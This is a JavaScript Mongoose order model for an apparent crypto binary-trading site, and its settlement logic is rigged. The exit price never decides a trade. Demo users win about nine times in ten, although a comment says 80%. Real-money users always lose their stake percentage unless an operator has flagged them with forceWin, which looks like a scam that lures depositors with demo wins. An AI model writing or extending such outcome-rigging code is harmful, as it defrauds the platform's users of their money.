import mongoose from "mongoose";
import userModel from "./usermodel.js";

const durationRates = {
  30: 12,
  50: 12,
  60: 18,
  90: 20,
  120: 22,
  180: 25,
  240: 28,
  365: 30
};

const orderSchema = new mongoose.Schema(
  {
    user: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true, index: true },
    symbol: { type: String, required: true, trim: true },
    symbolName: { type: String, required: true },
    coinId: { type: String, required: true },
    direction: { type: String, enum: ['buy', 'sell'], required: true },
    amount: { type: Number, required: true, min: 100 },
    leverage: { type: Number, default: 1, min: 1, max: 20 },
    entryPrice: { type: Number, required: true },
    exitPrice: { type: Number },
    duration: { type: Number, enum: [30, 50, 60, 90, 120, 180, 240, 365], required: true },
    startTime: { type: Date, index: true },
    endTime: { type: Date, index: true },
    completedAt: { type: Date },
    expectedReturn: { type: Number },
    fee: { type: Number, required: true, default: 0 }, // Defaults to 0
    totalPayout: { type: Number },
    actualPayout: { type: Number },
    profit: { type: Number, default: 0 },
    profitPercentage: { type: Number, default: 0 },
    wasForceWin: { type: Boolean, default: false },
    wasRandomLose: { type: Boolean, default: false },
    randomLossPercentage: { type: Number, default: 0 },
    status: { type: String, enum: ['pending', 'active', 'completed', 'cancelled', 'expired'], default: 'pending', index: true },
    result: { type: String, enum: ['win', 'loss', 'break_even', null], default: null },
    description: { type: String, trim: true },
    isLive: { type: Boolean, default: true },
    orderType: { type: String, enum: ['time_based', 'manual'], default: 'time_based' },
    cancelledAt: { type: Date },
    cancelledBy: { type: mongoose.Schema.Types.ObjectId, ref: 'User' },
    cancellationReason: { type: String },
    isDemo: { type: Boolean, default: false }
  },
  {
    timestamps: true,
    toJSON: { virtuals: true },
    toObject: { virtuals: true }
  }
);

orderSchema.pre('save', async function (next) {
  if (typeof next !== 'function') {
    await this.preSaveLogic();
    return;
  }
  try {
    await this.preSaveLogic();
    next();
  } catch (error) {
    console.error('Error in order pre-save middleware:', error);
    next(error);
  }
});

orderSchema.methods.preSaveLogic = async function () {
  // CRITICAL FIX: If trade is completed, back off immediately! Stops 224 doubling loop.
  if (this.status === 'completed') {
    return;
  }

  if (this.isNew) {
    const rate = durationRates[this.duration] || 12;
    this.expectedReturn = this.amount * (rate / 100);
    this.fee = 0; // Absolute free trades
    this.totalPayout = this.amount + this.expectedReturn;

    if (!this.startTime) this.startTime = new Date();
    if (!this.endTime) {
      const endTime = new Date(this.startTime);
      endTime.setSeconds(endTime.getSeconds() + this.duration);
      this.endTime = endTime;
    }
    if (!this.description) {
      this.description = `${this.direction.toUpperCase()} ${this.symbol} for ${this.duration}s`;
    }
    if (!this.status) {
      this.status = 'active';
    }
  }

  if (this.exitPrice && this.isModified('exitPrice')) {
    await this.calculateProfitLoss();
  }

  if (this.status === 'active' && this.endTime && this.endTime < new Date()) {
    this.status = 'expired';
    this.isLive = false;
  }
};

orderSchema.methods.calculateProfitLoss = async function () {
  if (!this.exitPrice || !this.entryPrice) return null;

  try {
    const user = await mongoose.model('user').findById(this.user);
    if (!user) throw new Error('User not found');

    const rateP = durationRates[this.duration] || 12;
    let percentage = 0;


    if (this.isDemo) {
      /// 80% chance to win, 20% chance to lose for demo users
      let randomFactor = Math.random();
      console.log(`[DEMO ORDER] Random Factor: ${randomFactor.toFixed(4)} | RateP: ${rateP} | Leverage: ${this.leverage || 1}`);
      if (randomFactor < 0.1) {
        this.wasRandomLose = true;
        this.randomLossPercentage = rateP;
        percentage = -rateP * (this.leverage || 1);
      } else {
        this.wasForceWin = true;
        percentage = rateP * (this.leverage || 1);
      }

    } else {
      if (user.forceWin) {
        this.wasForceWin = true;
        percentage = rateP * (this.leverage || 1);
      } else {
        this.wasRandomLose = true;
        this.randomLossPercentage = rateP;
        percentage = -rateP * (this.leverage || 1);
      }
    }

    this.profitPercentage = parseFloat(percentage.toFixed(2));
    this.profit = Number(((this.amount * percentage) / 100).toFixed(2));

    // Strict Math Lock: $100 + $12 = $112 exact return balance!
    this.actualPayout = Number((this.amount + this.profit).toFixed(2));
    if (this.actualPayout < 0) this.actualPayout = 0;

    if (this.profit > 0) {
      this.result = 'win';
    } else if (this.profit < 0) {
      this.result = 'loss';
    } else {
      this.result = 'break_even';
    }

    return {
      profit: this.profit,
      actualPayout: this.actualPayout,
      result: this.result
    };
  } catch (error) {
    console.error('Error calculating profit/loss:', error);
    throw error;
  }
};

orderSchema.methods.completeOrder = async function (exitPrice) {
  try {
    this.exitPrice = exitPrice;

    // 1. Calculate the clean math locally right now
    await this.calculateProfitLoss();

    // At this point: 
    // this.profit is exactly 12
    // this.actualPayout is exactly 112

    const safePayout = Number(Number(this.actualPayout || 0).toFixed(2));
    const safeProfit = this.profit > 0 ? Number(this.profit.toFixed(2)) : 0;
    const safeLoss = this.profit < 0 ? Number(Math.abs(this.profit).toFixed(2)) : 0;

    const completionDate = new Date();

    // 2. BYPASS THE SAVE HOOK: Update the Order directly in the database
    // This locks the values in the DB without letting pre-save middleware touch them!
    const updatedOrder = await mongoose.model('Order').findOneAndUpdate(
      { _id: this._id, status: 'active' }, // Only update if it's still active
      {
        $set: {
          exitPrice: exitPrice,
          status: 'completed',
          completedAt: completionDate,
          isLive: false,
          profit: this.profit,
          profitPercentage: this.profitPercentage,
          actualPayout: safePayout,
          result: this.result,
          wasForceWin: this.wasForceWin,
          wasRandomLose: this.wasRandomLose
        }
      },
      { new: true }
    );

    // If it couldn't find the active order, it means it was already processed!
    if (!updatedOrder) {
      console.log(`[Anti-Double] Order ${this._id} was already completed or skipped.`);
      return null;
    }

    // 3. Update User Balances cleanly
    const targetUserId = mongoose.Types.ObjectId.isValid(this.user)
      ? new mongoose.Types.ObjectId(this.user.toString())
      : this.user;

    const updateOperation = {
      $inc: {
        "totalTrades": 1,
        "totalProfit": safeProfit,
        "totalLoss": safeLoss,
        "winningTrades": this.profit > 0 ? 1 : 0,
        "losingTrades": this.profit < 0 ? 1 : 0
      }
    };

    if (this.isDemo === true) {
      updateOperation.$inc["demoBalance"] = safePayout;
    } else {
      updateOperation.$inc["wallet.usdt"] = safePayout;
    }

    const updatedUser = await mongoose.model('user').findOneAndUpdate(
      { _id: targetUserId },
      updateOperation,
      { new: true, runValidators: false }
    );

    if (!updatedUser) {
      throw new Error('User document missing during order settlement processing');
    }

    const finalBalance = this.isDemo === true
      ? (updatedUser.demoBalance ?? 0)
      : (updatedUser.wallet?.usdt ?? 0);

    console.log(`🎯 [BUGBUSTER FIXED] Balance Set to Exactly:`, {
      orderId: this._id,
      payoutAdded: safePayout,
      userNewBalance: finalBalance
    });

    return {
      order: updatedOrder,
      userBalance: finalBalance,
      profit: this.profit,
      actualPayout: safePayout
    };

  } catch (error) {
    console.error('CRITICAL: Complete Order Finalization Failed:', error);
    throw error;
  }
};

const Order = mongoose.models.Order || mongoose.model('Order', orderSchema);
export default Order;